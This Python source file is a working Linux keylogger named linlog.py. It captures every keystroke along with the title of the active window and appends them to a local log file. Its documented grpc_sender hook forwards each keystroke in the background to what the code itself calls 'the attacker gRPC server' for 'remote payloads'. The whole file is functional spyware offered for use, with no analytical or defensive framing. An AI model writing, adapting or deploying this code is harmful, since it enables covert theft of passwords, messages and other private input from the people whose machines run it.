# -*- coding: utf-8 -*-
"""
linlog.py - Linux Keylogger with Window Information

Simple keylogger that captures keystrokes and tracks active window.
Linux only - uses Xlib for window detection.

Usage:
    python linlog.py
    
Press ESC to stop.
"""

from pynput import keyboard
from datetime import datetime

try:
    from Xlib import display, X
    HAS_XLIB = True
except ImportError:
    HAS_XLIB = False
    print("[!] Xlib not found, window tracking disabled")
    print("[!] install with: pip install python-xlib")

# config
OUTPUT_FILE = 'keylog.txt'
ENABLE_TIMESTAMPS = True

# track last window to detect changes
last_window_title = ""

# optional callbacks — set by loggerFunction()
_action_callback = None   # legacy: called with (key_str, key_type, window, timestamp)
_grpc_sender = None       # NEW: called with a single formatted string → sends to gRPC


def get_active_window_title():
    """
    get title of currently active window using Xlib.
    returns 'Desktop' if no window is focused.
    """
    if not HAS_XLIB:
        return "Unknown"
    
    try:
        d = display.Display()
        root = d.screen().root
        
        NET_ACTIVE_WINDOW = d.intern_atom('_NET_ACTIVE_WINDOW')
        prop = root.get_full_property(NET_ACTIVE_WINDOW, X.AnyPropertyType)
        
        if not prop:
            return "Desktop"
        
        win_id = prop.value[0]
        if win_id == 0:
            return "Desktop"
        
        window = d.create_resource_object('window', win_id)
        
        NET_WM_NAME = d.intern_atom('_NET_WM_NAME')
        wm_name_prop = window.get_full_property(NET_WM_NAME, X.AnyPropertyType)
        
        if wm_name_prop:
            name = wm_name_prop.value
            if isinstance(name, bytes):
                return name.decode('utf-8', errors='ignore')
            return str(name)
        
        wm_name = window.get_wm_name()
        if wm_name:
            return wm_name
        
        return "Desktop"
        
    except Exception:
        return "Desktop"


def on_press(key):
    """
    called on every key press.
    - logs to file
    - sends to gRPC server via _grpc_sender (if set)
    - calls legacy _action_callback (if set)
    """
    global last_window_title
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    current_window = get_active_window_title()
    
    # resolve key string
    if hasattr(key, 'char') and key.char:
        key_str = key.char
        key_type = 'char'
    else:
        key_str = str(key).replace('Key.', '')
        key_type = 'special'

    # ── gRPC send (non-blocking, primary path for remote payloads) ──
    if _grpc_sender:
        import threading
        message = f"[LNX] {key_str} | {key_type} | {current_window} | {timestamp}"
        threading.Thread(target=_grpc_sender, args=(message,), daemon=True).start()

    # ── legacy action callback ──
    if _action_callback:
        import threading
        threading.Thread(
            target=_action_callback,
            args=(key_str, key_type, current_window, timestamp),
            daemon=True
        ).start()

    # ── write to local log file ──
    try:
        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            if current_window != last_window_title:
                f.write(f'\n--- Window: [{current_window}] at {timestamp} ---\n')
                last_window_title = current_window

            if key_type == 'char':
                if ENABLE_TIMESTAMPS:
                    f.write(f'[{timestamp}] Key: {key_str}\n')
                else:
                    f.write(key_str)
            else:
                if key_str == 'space':
                    f.write(' ')
                elif key_str == 'enter':
                    f.write('\n')
                elif ENABLE_TIMESTAMPS:
                    f.write(f'[{timestamp}] [{key_str}]\n')
                else:
                    f.write(f'[{key_str}]')
                
    except Exception as e:
        print(f"[ERROR] {e}")


def on_release(key):
    """stop logger when ESC is pressed."""
    if key == keyboard.Key.esc:
        print("[*] ESC pressed, stopping...")
        return False


def loggerFunction(action=None, grpc_sender=None):
    """
    main keylogger function.
    
    args:
        action:      legacy callback(key_str, key_type, window, timestamp) — optional
        grpc_sender: callable(message: str) — called non-blocking on every key press
                     to forward keystrokes to the attacker gRPC server.
                     Pass cln.send_key_non_blocking here for remote payloads.
    """
    global _action_callback, _grpc_sender
    _action_callback = action
    _grpc_sender = grpc_sender
    
    print("[*] Linux Keylogger Started")
    print(f"[*] Output: {OUTPUT_FILE}")
    print(f"[*] Timestamps: {ENABLE_TIMESTAMPS}")
    print(f"[*] gRPC sender: {'enabled' if grpc_sender else 'disabled'}")
    print(f"[*] Action callback: {'enabled' if action else 'disabled'}")
    print("[*] Press ESC to stop\n")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    _action_callback = None
    _grpc_sender = None
    print("[*] Keylogger stopped.")


if __name__ == "__main__":
    loggerFunction()